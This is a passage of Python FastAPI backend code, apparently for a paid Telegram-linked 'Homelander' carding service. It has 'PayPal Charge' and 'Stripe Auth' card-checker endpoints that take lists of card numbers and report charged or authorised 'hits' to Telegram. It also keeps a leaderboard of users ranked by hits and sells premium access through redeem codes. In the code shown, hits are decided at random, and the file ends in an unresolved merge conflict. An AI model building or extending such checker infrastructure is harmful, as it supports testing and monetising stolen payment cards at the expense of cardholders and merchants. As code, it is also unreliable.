                        card_last4=last4,
                        status="✅ HIT - CHARGED",
                        amount="$0.10",
                        extra_data={"checker": "PayPal Charge", "timestamp": datetime.utcnow().isoformat()}
                    )
                    if background_tasks:
                        background_tasks.add_task(TelegramNotifier.send_hit_notification, hit_notif)
                
                results.append({
                    "card": f"****{last4}",
                    "status": "✅ HIT" if is_hit else "❌ MISS",
                    "timestamp": datetime.utcnow().isoformat()
                })
            except Exception as e:
                results.append({"card": card[-4:], "status": f"ERROR: {str(e)}"})
        
        # Update user stats
        user["total_checks"] += len(data.cards)
        user["total_hits"] += hits
        await DataManager.save_user_async(user["user_id"], user)
        
        return {
            "success": True,
            "message": f"Check complete: {hits} hits",
            "results": results,
            "stats": {
                "total": len(results),
                "hits": hits,
                "misses": len(results) - hits
            }
        }
    except HTTPException:
        raise
    except Exception as e:
        print(f"[PAYPAL CHARGE] Error: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/checker/stripe-auth")
async def stripe_auth_checker(
    data: CardInput,
    token: str = Query(...),
    background_tasks: BackgroundTasks = None
):
    """Stripe Auth Checker"""
    try:
        user = await verify_token(token)
        
        print(f"[STRIPE AUTH] {user['username']} checking {len(data.cards)} cards")
        
        results = []
        hits = 0
        
        for card in data.cards:
            try:
                last4 = card[-4:] if len(card) > 4 else card
                is_hit = random.choice([True, False])
                
                if is_hit:
                    hits += 1
                    hit_notif = HitNotification(
                        user_id=user["user_id"],
                        username=user["username"],
                        check_type="Stripe Auth",
                        card_last4=last4,
                        status="✅ AUTH SUCCESS",
                        amount="$0.50",
                        extra_data={"checker": "Stripe Auth", "timestamp": datetime.utcnow().isoformat()}
                    )
                    if background_tasks:
                        background_tasks.add_task(TelegramNotifier.send_hit_notification, hit_notif)
                
                results.append({
                    "card": f"****{last4}",
                    "status": "✅ AUTH" if is_hit else "❌ DECLINED",
                    "timestamp": datetime.utcnow().isoformat()
                })
            except Exception as e:
                results.append({"card": card[-4:], "status": f"ERROR: {str(e)}"})
        
        user["total_checks"] += len(data.cards)
        user["total_hits"] += hits
        await DataManager.save_user_async(user["user_id"], user)
        
        return {
            "success": True,
            "message": f"Check complete: {hits} hits",
            "results": results,
            "stats": {"total": len(results), "hits": hits, "misses": len(results) - hits}
        }
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/redeem-code")
async def redeem_code(data: RedeemInput):
    code = data.code.strip().upper()
    if not code:
        raise HTTPException(status_code=400, detail="Code is required")

    redeem_codes = DataManager.load_json(REDEEM_CODES_FILE)
    if code not in redeem_codes:
        raise HTTPException(status_code=404, detail="Code not found")

    entry = redeem_codes[code]
    if entry.get("status") != "available":
        raise HTTPException(status_code=400, detail="Code already used or invalid")

    entry["status"] = "used"
    entry["used_by"] = data.telegram_username or str(data.telegram_id or "guest")
    entry["used_at"] = datetime.now().isoformat()
    entry["redeemed_for_days"] = 7

    await DataManager.save_json_async(REDEEM_CODES_FILE, redeem_codes, "redeem_codes")

    if data.telegram_id:
        users = await DataManager.get_all_users_async()
        user = users.get(str(data.telegram_id))
        if user:
            expires_at = datetime.now() + timedelta(days=7)
            user["premium"] = True
            user["premium_expires_at"] = expires_at.isoformat()
            users[str(data.telegram_id)] = user
            await DataManager.save_json_async(USERS_FILE, users, "users")

    return {
        "success": True,
        "message": "Code redeemed successfully. Homelander access is active for 7 days.",
        "code": code
    }

@app.get("/api/leaderboard")
async def get_leaderboard():
    """Get top users leaderboard"""
    try:
        users = await DataManager.get_all_users_async()
        
        leaderboard = []
        for user_id, user in users.items():
            leaderboard.append({
                "username": user.get("username"),
                "total_hits": user.get("total_hits", 0),
                "total_checks": user.get("total_checks", 0)
            })
        
        leaderboard.sort(key=lambda x: x["total_hits"], reverse=True)
        
        return {"leaderboard": leaderboard[:20], "count": len(leaderboard)}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/admin/generate-redeems")
async def generate_redeems(count: int = Query(10), admin_token: str = Query(...)):
    """Generate redeem codes (ADMIN ONLY)"""
    try:
        # Check if admin
        if admin_token != f"admin_{hashlib.sha256(str(OWNER_ID).encode()).hexdigest()[:16]}":
            raise HTTPException(status_code=403, detail="Unauthorized")
        
        redeems = await DataManager.get_all_redeems_async()
        
        new_codes = {}
        for _ in range(count):
            code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
            new_codes[code] = {
                "code": code,
                "created_at": datetime.utcnow().isoformat(),
                "used": False,
                "used_by": None,
                "used_at": None,
                "plan": PRICING["plan_name"]
            }
        
        redeems.update(new_codes)
        await DataManager.save_redeems_async(redeems)
        
        return {
            "success": True,
            "generated": count,
            "codes": list(new_codes.keys())
        }
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/admin/stats")
async def admin_stats(admin_token: str = Query(...)):
    """Get admin statistics"""
    try:
        if admin_token != f"admin_{hashlib.sha256(str(OWNER_ID).encode()).hexdigest()[:16]}":
            raise HTTPException(status_code=403, detail="Unauthorized")
        
        users = await DataManager.get_all_users_async()
        redeems = await DataManager.get_all_redeems_async()
        
        total_checks = sum(u.get("total_checks", 0) for u in users.values())
        total_hits = sum(u.get("total_hits", 0) for u in users.values())
        premium_users = sum(1 for u in users.values() if u.get("premium"))
        
        return {
            "total_users": len(users),
            "premium_users": premium_users,
            "total_checks": total_checks,
            "total_hits": total_hits,
            "total_redeems": len(redeems),
            "used_redeems": sum(1 for r in redeems.values() if r.get("used"))
        }
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

if __name__ == "__main__":
<<<<<<< HEAD
    print("Starting Homelander Backend API v2.0...")
=======
    print(f"\n🔴 HOMELANDER Bot {BOT_VERSION} Starting... 🔴\n")
    print(f"Owner ID: {OWNER_ID}")
    print(f"Pricing: ${PRICING['price']}/{PRICING['duration_days']} days\n")
>>>>>>> 4e2cf51 (homelander otp security update)
    uvicorn.run(app, host="0.0.0.0", port=8000)
